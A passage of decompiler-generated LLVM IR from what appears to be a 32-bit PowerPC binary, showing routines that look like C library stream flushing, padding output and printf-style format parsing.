  %v3_1000535c = load i32, i32* @global_var_1001043c.215, align 4
  store i32 %v3_1000535c, i32* %r0.global-to-local, align 4
  %v1_10005360 = and i32 %v3_10005358, 8192
  store i32 %v1_10005360, i32* %r9.global-to-local, align 4
  %v3_10005360 = icmp eq i32 %v1_10005360, 0
  %v2_10005364 = add i32 %v0_10005358, 52
  %v3_10005364 = inttoptr i32 %v2_10005364 to i32*
  store i32 %v3_1000535c, i32* %v3_10005364, align 4
  br i1 %v3_10005360, label %dec_label_pc_100053ec, label %dec_label_pc_1000536c

dec_label_pc_1000536c:                            ; preds = %dec_label_pc_10005330
  store i32 ptrtoint ([3 x i8]* @global_var_10008c78.194 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_100100fc.195 to i32), i32* %r29.global-to-local, align 4
  %v2_1000537c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000537c, i32* @r26, align 4
  store i32 %v2_1000537c, i32* @r3, align 4
  %v0_1000538c = call i32 @function_10008c80()
  %v2_10005398 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10005398, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_100100e4.216 to i32), i32* @r29, align 4
  %v0_100053a0 = call i32 @function_10008c78()
  store i32 %v2_10005398, i32* @r3, align 4
  %v0_100053b0 = call i32 @function_10008c80()
  %v0_100053b8 = call i32 @function_10008c78()
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_100053c0 = load i32, i32* bitcast (i32** @global_var_10010438.217 to i32*), align 4
  store i32 %v3_100053c0, i32* %r0.global-to-local, align 4
  store i32 %v2_10005398, i32* @r3, align 4
  %v1_100053cc = load i32, i32* @r31, align 4
  %v2_100053cc = add i32 %v1_100053cc, 32
  %v3_100053cc = inttoptr i32 %v2_100053cc to i32*
  store i32 %v3_100053c0, i32* %v3_100053cc, align 4
  %v0_100053d0 = load i32, i32* @r31, align 4
  store i32 %v0_100053d0, i32* bitcast (i32** @global_var_10010438.217 to i32*), align 4
  %v0_100053d4 = call i32 @function_10008c80()
  store i32 %v2_1000537c, i32* @r3, align 4
  %v0_100053e0 = call i32 @function_10008c80()
  br label %dec_label_pc_100053ec

dec_label_pc_100053e8:                            ; preds = %dec_label_pc_10005198, %dec_label_pc_10005184, %dec_label_pc_100051a4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_100053ec

dec_label_pc_100053ec:                            ; preds = %dec_label_pc_10005330, %dec_label_pc_100051e4, %dec_label_pc_1000536c, %dec_label_pc_100053e8
  store i32 %v0_10005148, i32* %r0.global-to-local, align 4
  %v0_100053f0 = load i32, i32* @r31, align 4
  ret i32 %v0_100053f0

; uselistorder directives
  uselistorder i32 %v1_1000532c, { 2, 0, 1 }
  uselistorder i32 %v1_100052ac, { 1, 0 }
  uselistorder i32 %v0_1000529c, { 1, 0 }
  uselistorder i32 %v1_100051e8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100051d4, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 16 }
  uselistorder i8 114, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_100053ec, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_100053e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005330, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10005278, { 1, 0 }
  uselistorder label %dec_label_pc_1000520c, { 1, 0 }
  uselistorder label %dec_label_pc_100051dc, { 1, 0 }
  uselistorder label %dec_label_pc_100051c8, { 1, 0 }
  uselistorder label %dec_label_pc_100051b4, { 2, 0, 1 }
}

define i32 @function_10005404(i32 %arg1) local_unnamed_addr {
dec_label_pc_10005404:
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* @r28, align 4
  %v0_10005418 = call i32 @function_10004b48()
  store i32 %v0_10005418, i32* @r26, align 4
  %v1_10005424 = inttoptr i32 %v0_10005418 to i32*
  %v2_10005424 = load i32, i32* %v1_10005424, align 4
  store i32 %v2_10005424, i32* @r25, align 4
  store i32 ptrtoint (i16* @global_var_10010114.190 to i32), i32* @r27, align 4
  %v3_1000542c = load i16, i16* @global_var_10010114.190, align 2
  %v4_1000542c = zext i16 %v3_1000542c to i32
  store i32 %v4_1000542c, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005434.219 to i32), i32* @lr, align 4
  %v1_10005430 = call i32 @function_10007408(i32 0)
  %v1_10005434 = sub i32 1, %v1_10005430
  %v1_10005438 = mul i32 %v1_10005434, 256
  %v0_1000543c = load i32, i32* @r29, align 4
  %v2_1000543c = xor i32 %v1_10005438, %v0_1000543c
  %v1_10005444 = trunc i32 %v2_1000543c to i16
  store i16 %v1_10005444, i16* @global_var_10010114.190, align 2
  %v3_10005448 = load i16, i16* @global_var_10010164.191, align 2
  %v4_10005448 = zext i16 %v3_10005448 to i32
  store i32 %v4_10005448, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005450.220 to i32), i32* @lr, align 4
  %v1_1000544c = call i32 @function_10007408(i32 1)
  %v1_10005450 = sub i32 1, %v1_1000544c
  %v1_10005454 = mul i32 %v1_10005450, 256
  %v0_10005458 = load i32, i32* @r29, align 4
  %v2_10005458 = xor i32 %v1_10005454, %v0_10005458
  %v1_1000545c = trunc i32 %v2_10005458 to i16
  store i16 %v1_1000545c, i16* @global_var_10010164.191, align 2
  %v0_10005460 = load i32, i32* @r25, align 4
  %v1_10005460 = load i32, i32* @r26, align 4
  %v2_10005460 = inttoptr i32 %v1_10005460 to i32*
  store i32 %v0_10005460, i32* %v2_10005460, align 4
  ret i32 %v1_10005454

; uselistorder directives
  uselistorder i32 %v1_10005454, { 1, 0 }
  uselistorder i16* @global_var_10010164.191, { 1, 0 }
}

define i32 @function_10005478() local_unnamed_addr {
dec_label_pc_10005478:
  store i32 24, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000e044.221 to i32), i32* @r4, align 4
  %v0_10005484 = call i32 @function_10006d88()
  ret i32 %v0_10005484
}

define i32 @function_10005488(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10005488:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_100100e4.216 to i32), i32* @r3, align 4
  store i32 268457124, i32* @lr, align 4
  %v0_100054a0 = call i32 @function_10005478()
  store i32 ptrtoint (i32* @global_var_100100fc.195 to i32), i32* @r3, align 4
  store i32 268457136, i32* @lr, align 4
  %v0_100054ac = call i32 @function_10005478()
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %storemerge6 = load i32, i32* bitcast (i32** @global_var_10010438.217 to i32*), align 4
  store i32 %storemerge6, i32* %r31.global-to-local, align 4
  %v3_100054f89 = icmp eq i32 %storemerge6, 0
  %v1_100054fc11 = add i32 %storemerge6, 56
  store i32 %v1_100054fc11, i32* %r30.global-to-local, align 4
  br i1 %v3_100054f89, label %dec_label_pc_10005508, label %dec_label_pc_100054bc

dec_label_pc_100054bc:                            ; preds = %dec_label_pc_10005488, %dec_label_pc_100054e8
  %v0_100054bc = call i32 @function_10008c78()
  %v3_100054c0 = icmp eq i32 %v0_100054bc, 0
  %v0_100054c4 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_100054c4, i32* @r3, align 4
  br i1 %v3_100054c0, label %dec_label_pc_100054e8, label %dec_label_pc_100054cc

dec_label_pc_100054cc:                            ; preds = %dec_label_pc_100054bc
  %v0_100054cc = load i32, i32* %r31.global-to-local, align 4
  %v1_100054cc = add i32 %v0_100054cc, 8
  %v2_100054cc = inttoptr i32 %v1_100054cc to i32*
  %v3_100054cc = load i32, i32* %v2_100054cc, align 4
  store i32 %v3_100054cc, i32* %r9.global-to-local, align 4
  %v3_100054d4 = inttoptr i32 %v0_100054cc to i16*
  store i16 48, i16* %v3_100054d4, align 2
  %v0_100054d8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100054d8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100054d8 = add i32 %v1_100054d8, 20
  %v3_100054d8 = inttoptr i32 %v2_100054d8 to i32*
  store i32 %v0_100054d8, i32* %v3_100054d8, align 4
  %v0_100054dc = load i32, i32* %r9.global-to-local, align 4
  %v1_100054dc = load i32, i32* %r31.global-to-local, align 4
  %v2_100054dc = add i32 %v1_100054dc, 24
  %v3_100054dc = inttoptr i32 %v2_100054dc to i32*
  store i32 %v0_100054dc, i32* %v3_100054dc, align 4
  %v0_100054e0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100054e0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100054e0 = add i32 %v1_100054e0, 28
  %v3_100054e0 = inttoptr i32 %v2_100054e0 to i32*
  store i32 %v0_100054e0, i32* %v3_100054e0, align 4
  %v0_100054e4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100054e4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100054e4 = add i32 %v1_100054e4, 16
  %v3_100054e4 = inttoptr i32 %v2_100054e4 to i32*
  store i32 %v0_100054e4, i32* %v3_100054e4, align 4
  br label %dec_label_pc_100054e8

dec_label_pc_100054e8:                            ; preds = %dec_label_pc_100054bc, %dec_label_pc_100054cc
  %v1_100054ec = load i32, i32* %r31.global-to-local, align 4
  %v2_100054ec = add i32 %v1_100054ec, 52
  %v3_100054ec = inttoptr i32 %v2_100054ec to i32*
  store i32 1, i32* %v3_100054ec, align 4
  store i32 268457204, i32* @lr, align 4
  %v0_100054f0 = call i32 @function_10005478()
  %v0_100054f4 = load i32, i32* %r31.global-to-local, align 4
  %v1_100054f4 = add i32 %v0_100054f4, 32
  %v2_100054f4 = inttoptr i32 %v1_100054f4 to i32*
  %storemerge = load i32, i32* %v2_100054f4, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_100054f8 = icmp eq i32 %storemerge, 0
  %v1_100054fc = add i32 %storemerge, 56
  store i32 %v1_100054fc, i32* %r30.global-to-local, align 4
  br i1 %v3_100054f8, label %dec_label_pc_100054f8.dec_label_pc_10005508_crit_edge, label %dec_label_pc_100054bc

dec_label_pc_100054f8.dec_label_pc_10005508_crit_edge: ; preds = %dec_label_pc_100054e8
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_10010438.217 to i32*), align 4
  br label %dec_label_pc_10005508

dec_label_pc_10005508:                            ; preds = %dec_label_pc_100054f8.dec_label_pc_10005508_crit_edge, %dec_label_pc_10005488
  %v0_1000554416 = phi i32 [ %v1_100054fc, %dec_label_pc_100054f8.dec_label_pc_10005508_crit_edge ], [ %v1_100054fc11, %dec_label_pc_10005488 ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_100054f8.dec_label_pc_10005508_crit_edge ], [ 0, %dec_label_pc_10005488 ]
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 %storemerge12, i32* @r31, align 4
  %v3_1000552c5 = icmp eq i32 %storemerge12, 0
  br i1 %v3_1000552c5, label %dec_label_pc_10005534, label %dec_label_pc_10005514

dec_label_pc_10005514:                            ; preds = %dec_label_pc_10005508, %dec_label_pc_10005528
  %v0_10005514 = phi i32 [ %storemerge1, %dec_label_pc_10005528 ], [ %storemerge12, %dec_label_pc_10005508 ]
  %v1_10005514 = inttoptr i32 %v0_10005514 to i16*
  %v2_10005514 = load i16, i16* %v1_10005514, align 2
  %v3_10005514 = zext i16 %v2_10005514 to i32
  store i32 %v0_10005514, i32* @r3, align 4
  %v1_1000551c = and i32 %v3_10005514, 64
  store i32 %v1_1000551c, i32* %r9.global-to-local, align 4
  %v3_1000551c = icmp eq i32 %v1_1000551c, 0
  br i1 %v3_1000551c, label %dec_label_pc_10005528, label %dec_label_pc_10005524

dec_label_pc_10005524:                            ; preds = %dec_label_pc_10005514
  store i32 268457256, i32* @lr, align 4
  %v0_10005524 = call i32 @function_10005548()
  %v0_10005528.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10005528

dec_label_pc_10005528:                            ; preds = %dec_label_pc_10005514, %dec_label_pc_10005524
  %v0_10005528 = phi i32 [ %v0_10005514, %dec_label_pc_10005514 ], [ %v0_10005528.pre, %dec_label_pc_10005524 ]
  %v0_1000554417 = phi i32 [ %v0_10005514, %dec_label_pc_10005514 ], [ %v0_10005524, %dec_label_pc_10005524 ]
  %v1_10005528 = add i32 %v0_10005528, 32
  %v2_10005528 = inttoptr i32 %v1_10005528 to i32*
  %storemerge1 = load i32, i32* %v2_10005528, align 4
  store i32 %storemerge1, i32* @r31, align 4
  %v3_1000552c = icmp eq i32 %storemerge1, 0
  br i1 %v3_1000552c, label %dec_label_pc_10005534, label %dec_label_pc_10005514

dec_label_pc_10005534:                            ; preds = %dec_label_pc_10005528, %dec_label_pc_10005508
  %v0_10005544 = phi i32 [ %v0_1000554416, %dec_label_pc_10005508 ], [ %v0_1000554417, %dec_label_pc_10005528 ]
  ret i32 %v0_10005544

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %v0_10005514, { 0, 1, 3, 2 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32* %r31.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r30.global-to-local, { 2, 1, 0 }
  uselistorder i32 ()* @function_10005478, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_10005528, { 1, 0 }
  uselistorder label %dec_label_pc_10005514, { 1, 0 }
  uselistorder label %dec_label_pc_100054e8, { 1, 0 }
  uselistorder label %dec_label_pc_100054bc, { 1, 0 }
}

define i32 @function_10005548() local_unnamed_addr {
dec_label_pc_10005548:
  %v0_10005550 = load i32, i32* @r31, align 4
  %v0_10005554 = load i32, i32* @r3, align 4
  %v1_1000555c = add i32 %v0_10005554, 8
  %v2_1000555c = inttoptr i32 %v1_1000555c to i32*
  %v3_1000555c = load i32, i32* %v2_1000555c, align 4
  %v1_10005560 = add i32 %v0_10005554, 16
  %v2_10005560 = inttoptr i32 %v1_10005560 to i32*
  %v3_10005560 = load i32, i32* %v2_10005560, align 4
  %v2_10005568 = sub i32 %v3_10005560, %v3_1000555c
  store i32 %v2_10005568, i32* @r5, align 4
  %v5_10005568 = icmp eq i32 %v2_10005568, 0
  br i1 %v5_10005568, label %dec_label_pc_10005578, label %dec_label_pc_10005570

dec_label_pc_10005570:                            ; preds = %dec_label_pc_10005548
  store i32 %v3_1000555c, i32* %v2_10005560, align 4
  store i32 268457336, i32* @lr, align 4
  %v2_10005574 = inttoptr i32 %v3_1000555c to i16*
  %v3_10005574 = call i32 @function_100096f4(i16* %v2_10005574, i32 %v2_10005568)
  %v0_10005578.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10005578

dec_label_pc_10005578:                            ; preds = %dec_label_pc_10005548, %dec_label_pc_10005570
  %v0_10005578 = phi i32 [ %v0_10005554, %dec_label_pc_10005548 ], [ %v0_10005578.pre, %dec_label_pc_10005570 ]
  %v1_10005578 = add i32 %v0_10005578, 8
  %v2_10005578 = inttoptr i32 %v1_10005578 to i32*
  %v3_10005578 = load i32, i32* %v2_10005578, align 4
  %v1_1000557c = add i32 %v0_10005578, 16
  %v2_1000557c = inttoptr i32 %v1_1000557c to i32*
  %v3_1000557c = load i32, i32* %v2_1000557c, align 4
  store i32 %v0_10005550, i32* @r31, align 4
  %v2_10005584 = sub i32 %v3_1000557c, %v3_10005578
  ret i32 %v2_10005584

; uselistorder directives
  uselistorder i32 %v0_10005578, { 1, 0 }
  uselistorder i32 %v3_1000555c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005578, { 1, 0 }
}

define i32 @function_10005598(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10005598:
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg3, i32* @r31, align 4
  store i8 %arg2, i8* %stack_var_-40, align 1
  %v3_100055c03 = icmp eq i32 %arg3, 0
  %v2_100055c4 = ptrtoint i8* %stack_var_-40 to i32
  br i1 %v3_100055c03, label %dec_label_pc_100055e0, label %dec_label_pc_100055d4

dec_label_pc_100055bc:                            ; preds = %dec_label_pc_100055d4
  %v1_100055bc = add i32 %v0_100055bc, -1
  store i32 %v1_100055bc, i32* @r31, align 4
  %v3_100055c0 = icmp eq i32 %v1_100055bc, 0
  %v0_100055cc = load i32, i32* @r29, align 4
  br i1 %v3_100055c0, label %dec_label_pc_100055e0.loopexit, label %dec_label_pc_100055d4

dec_label_pc_100055d4:                            ; preds = %dec_label_pc_10005598, %dec_label_pc_100055bc
  %v0_100055cc5 = phi i32 [ %v0_100055cc, %dec_label_pc_100055bc ], [ %arg1, %dec_label_pc_10005598 ]
  store i32 268457432, i32* @lr, align 4
  %v3_100055d4 = inttoptr i32 %v0_100055cc5 to i16*
  %v4_100055d4 = call i32 @function_100097d4(i32 %v2_100055c4, i32 1, i16* %v3_100055d4)
  %v3_100055d8 = icmp eq i32 %v4_100055d4, 1
  %v0_100055bc = load i32, i32* @r31, align 4
  br i1 %v3_100055d8, label %dec_label_pc_100055bc, label %dec_label_pc_100055e0.loopexit

dec_label_pc_100055e0.loopexit:                   ; preds = %dec_label_pc_100055bc, %dec_label_pc_100055d4
  %v0_100055e4.ph = phi i32 [ %v0_100055bc, %dec_label_pc_100055d4 ], [ 0, %dec_label_pc_100055bc ]
  %v1_100055e4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100055e0

dec_label_pc_100055e0:                            ; preds = %dec_label_pc_100055e0.loopexit, %dec_label_pc_10005598
  %v1_100055e4 = phi i32 [ 0, %dec_label_pc_10005598 ], [ %v1_100055e4.pre, %dec_label_pc_100055e0.loopexit ]
  %v0_100055e4 = phi i32 [ 0, %dec_label_pc_10005598 ], [ %v0_100055e4.ph, %dec_label_pc_100055e0.loopexit ]
  %v2_100055e4 = sub i32 %v1_100055e4, %v0_100055e4
  ret i32 %v2_100055e4

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100055e0.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_100055d4, { 1, 0 }
}

define i32 @function_100055f8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_100055f8:
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %v1_10005604 = and i32 %arg2, 128
  %v3_10005604 = icmp eq i32 %v1_10005604, 0
  store i32 %arg1, i32* %r26.global-to-local, align 4
  store i32 %arg2, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r27, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  br i1 %v3_10005604, label %dec_label_pc_1000565c, label %dec_label_pc_10005628

dec_label_pc_10005628:                            ; preds = %dec_label_pc_100055f8
  %v0_10005628 = call i32 @function_10006ed4()
  %v0_1000562c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10005628, i32* @r31, align 4
  %v0_10005634 = load i32, i32* %r26.global-to-local, align 4
  %v1_10005638 = load i32, i32* %r30.global-to-local, align 4
  %v2_10005638 = sub i32 %v1_10005638, %v0_10005628
  store i32 %v2_10005638, i32* %r29.global-to-local, align 4
  store i32 %v0_10005628, i32* %r30.global-to-local, align 4
  %tmp7 = icmp slt i32 %v2_10005638, 1
  br i1 %tmp7, label %dec_label_pc_1000565c, label %dec_label_pc_10005648

dec_label_pc_10005648:                            ; preds = %dec_label_pc_10005628
  %v1_1000562c = urem i32 %v0_1000562c, 128
  store i32 268457548, i32* @lr, align 4
  %v3_10005648 = trunc i32 %v1_1000562c to i8
  %v4_10005648 = call i32 @function_10005598(i32 %v0_10005634, i8 %v3_10005648, i32 %v2_10005638)
  %v0_1000564c = load i32, i32* @r31, align 4
  store i32 %v0_1000564c, i32* %r30.global-to-local, align 4
  %v1_10005650 = load i32, i32* @r29, align 4
  %v4_10005650 = icmp eq i32 %v4_10005648, %v1_10005650
  store i32 %v4_10005648, i32* @r28, align 4
  br i1 %v4_10005650, label %dec_label_pc_10005648.dec_label_pc_1000565c_crit_edge, label %dec_label_pc_10005680

dec_label_pc_10005648.dec_label_pc_1000565c_crit_edge: ; preds = %dec_label_pc_10005648
  %v0_10005668.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_1000565c

dec_label_pc_1000565c:                            ; preds = %dec_label_pc_10005648.dec_label_pc_1000565c_crit_edge, %dec_label_pc_10005628, %dec_label_pc_100055f8
  %v0_10005668 = phi i32 [ %v0_10005668.pre, %dec_label_pc_10005648.dec_label_pc_1000565c_crit_edge ], [ %v0_10005634, %dec_label_pc_10005628 ], [ %arg1, %dec_label_pc_100055f8 ]
  %v0_10005664 = phi i32 [ %v0_1000564c, %dec_label_pc_10005648.dec_label_pc_1000565c_crit_edge ], [ %v0_10005628, %dec_label_pc_10005628 ], [ %arg3, %dec_label_pc_100055f8 ]
  %tmp8 = icmp slt i32 %v0_10005664, 1
  br i1 %tmp8, label %dec_label_pc_1000567c, label %dec_label_pc_10005674

dec_label_pc_10005674:                            ; preds = %dec_label_pc_1000565c
  %v0_10005660 = load i32, i32* @r27, align 4
  store i32 268457592, i32* @lr, align 4
  %v3_10005674 = inttoptr i32 %v0_10005668 to i16*
  %v4_10005674 = call i32 @function_100097d4(i32 %v0_10005660, i32 %v0_10005664, i16* %v3_10005674)
  br label %dec_label_pc_1000567c

dec_label_pc_1000567c:                            ; preds = %dec_label_pc_1000565c, %dec_label_pc_10005674
  %v1_1000567c = phi i32 [ 0, %dec_label_pc_1000565c ], [ %v4_10005674, %dec_label_pc_10005674 ]
  %v0_1000567c = load i32, i32* @r28, align 4
  %v2_1000567c = add i32 %v0_1000567c, %v1_1000567c
  br label %dec_label_pc_10005680

dec_label_pc_10005680:                            ; preds = %dec_label_pc_10005648, %dec_label_pc_1000567c
  %v0_10005684 = phi i32 [ %v4_10005648, %dec_label_pc_10005648 ], [ %v2_1000567c, %dec_label_pc_1000567c ]
  ret i32 %v0_10005684

; uselistorder directives
  uselistorder i32 %v0_10005664, { 1, 0 }
  uselistorder i32 %v2_10005638, { 1, 0, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_10005680, { 1, 0 }
  uselistorder label %dec_label_pc_1000567c, { 1, 0 }
}

define i32 @function_10005698() local_unnamed_addr {
dec_label_pc_10005698:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i8 @__decompiler_undefined_function_2()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp59 = call i8 @__decompiler_undefined_function_2()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-201 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-200 = alloca i8*, align 4
  %v0_1000569c = load i32, i32* @lr, align 4
  store i32 %v0_1000569c, i32* %r0.global-to-local, align 4
  %v2_100056a4 = ptrtoint i8** %stack_var_-200 to i32
  store i32 %v2_100056a4, i32* %r30.global-to-local, align 4
  %v0_100056a8 = load i32, i32* @r3, align 4
  store i32 %v0_100056a8, i32* %r24.global-to-local, align 4
  %v0_100056b4 = load i32, i32* @r5, align 4
  store i32 %v0_100056b4, i32* %r31.global-to-local, align 4
  %v0_100056b8 = load i32, i32* @r4, align 4
  store i32 %v0_100056b8, i32* @r29, align 4
  store i32 268457664, i32* @lr, align 4
  %v1_100056bc = bitcast i8** %stack_var_-200 to i32*
  %v2_100056bc = call i32 @function_10005d00(i32* %v1_100056bc)
  %tmp72 = icmp sgt i32 %v2_100056bc, -1
  br i1 %tmp72, label %dec_label_pc_100056f0, label %dec_label_pc_100056c8

dec_label_pc_100056c8:                            ; preds = %dec_label_pc_10005698
  %v3_100056c8 = load i8*, i8** %stack_var_-200, align 4
  %v4_100056c8 = ptrtoint i8* %v3_100056c8 to i32
  store i32 %v4_100056c8, i32* @r31, align 4
  store i32 -1, i32* %r23.global-to-local, align 4
  store i32 %v4_100056c8, i32* @r3, align 4
  %v0_100056d4 = call i32 @function_10006ed4()
  %v3_100056d8 = icmp eq i32 %v0_100056d4, 0
  br i1 %v3_100056d8, label %dec_label_pc_10005ce8, label %dec_label_pc_100056e0

dec_label_pc_100056e0:                            ; preds = %dec_label_pc_100056c8
  %v0_100056e0 = load i32, i32* @r31, align 4
  %v0_100056e4 = load i32, i32* %r24.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100056ec.222 to i32), i32* @lr, align 4
  %v3_100056e8 = inttoptr i32 %v0_100056e4 to i16*
  %v4_100056e8 = call i32 @function_100097d4(i32 %v0_100056e0, i32 %v0_100056d4, i16* %v3_100056e8)
  br label %dec_label_pc_10005ce8

dec_label_pc_100056f0:                            ; preds = %dec_label_pc_10005698
  %v0_100056f4 = load i32, i32* @r31, align 4
  store i32 268457724, i32* @lr, align 4
  %v2_100056f8 = call i32 @function_10005dbc(i32 %v2_100056a4, i32 %v0_100056f4)
  store i32 0, i32* %r23.global-to-local, align 4
  %v2_10005790 = ptrtoint i32* %stack_var_-112 to i32
  %v4_10005794 = zext i8 %tmp59 to i32
  %tmp73 = icmp slt i32 %tmp60, 1
  %v2_100057b8 = ptrtoint i32* %stack_var_-344 to i32
  %v3_100057bc = icmp eq i32 %tmp58, 0
  %tmp74 = icmp sgt i32 %tmp58, -1
  %v3_100057f0 = icmp eq i32 %tmp57, 0
  %v2_10005b48 = ptrtoint i32* %stack_var_-328 to i32
  %v2_10005a68 = ptrtoint i32* %stack_var_-340 to i32
  %v2_10005a6c = ptrtoint i32* %stack_var_-336 to i32
  %v5_100058e0 = bitcast i32* %stack_var_-201 to i8*
  %tmp75 = icmp ult i32 %tmp57, 6
  %v3_100059bc = icmp eq i32 %tmp57, 1
  %v2_10005960 = icmp ugt i32 %tmp57, 2
  %v4_100058a0 = zext i8 %tmp55 to i32
  %v0_10005cd4.pre = load i32, i32* @r29, align 4
  %v1_100057c0 = add i32 %tmp58, 1
  %v2_10005818 = icmp ugt i32 %tmp57, 7
  %v2_100059f4 = icmp ugt i32 %tmp57, 15
  %v2_10005a28 = icmp ugt i32 %tmp57, 17
  %v3_10005a28 = icmp eq i32 %tmp57, 17
  %v2_10005ad0 = icmp ugt i32 %tmp57, 19
  %v3_10005ad0 = icmp eq i32 %tmp57, 19
  %v3_10005b3c = icmp eq i32 %tmp57, 20
  %v1_10005830 = add i32 %tmp57, add (i32 ptrtoint (i32* @global_var_1000e078.224 to i32), i32 -1)
  %v2_10005830 = inttoptr i32 %v1_10005830 to i8*
  %v3_1000596c = icmp eq i32 %tmp57, 3
  %v3_1000597c = icmp eq i32 %tmp57, 4
  %v1_100057a4 = mul nuw nsw i32 %v4_10005794, 8
  %v2_100057a8 = add i32 %v2_10005790, %v1_100057a4
  %v1_100057ac = add i32 %v2_100057a8, -8
  br label %dec_label_pc_10005cd4

dec_label_pc_10005708.backedge:                   ; preds = %dec_label_pc_1000575c, %dec_label_pc_10005714
  %storemerge12.in = phi i32 [ %v1_10005724, %dec_label_pc_10005714 ], [ %v1_1000575c, %dec_label_pc_1000575c ]
  %v1_1000571c15 = phi i32 [ %v0_10005734, %dec_label_pc_10005714 ], [ %v1_1000575c, %dec_label_pc_1000575c ]
  %storemerge12 = add i32 %storemerge12.in, 1
  store i32 %storemerge12, i32* @r29, align 4
  br label %dec_label_pc_10005708

dec_label_pc_10005708:                            ; preds = %dec_label_pc_10005708.backedge, %dec_label_pc_10005cd4
  %v0_10005734 = phi i32 [ %v1_1000571c15, %dec_label_pc_10005708.backedge ], [ %v0_10005cd4, %dec_label_pc_10005cd4 ]
  %v1_10005724 = phi i32 [ %storemerge12, %dec_label_pc_10005708.backedge ], [ %v0_10005cd4, %dec_label_pc_10005cd4 ]
  %v1_10005708 = inttoptr i32 %v1_10005724 to i8*
  %v2_10005708 = load i8, i8* %v1_10005708, align 1
  %v3_10005708 = zext i8 %v2_10005708 to i32
  store i32 %v3_10005708, i32* %r0.global-to-local, align 4
  %v3_1000570c = icmp eq i8 %v2_10005708, 0
  br i1 %v3_1000570c, label %dec_label_pc_1000571c, label %dec_label_pc_10005714

dec_label_pc_10005714:                            ; preds = %dec_label_pc_10005708
  %v3_10005714 = icmp eq i8 %v2_10005708, 37
  br i1 %v3_10005714, label %dec_label_pc_1000571c, label %dec_label_pc_10005708.backedge

dec_label_pc_1000571c:                            ; preds = %dec_label_pc_10005714, %dec_label_pc_10005708
  %v4_1000571c = icmp eq i32 %v1_10005724, %v0_10005734
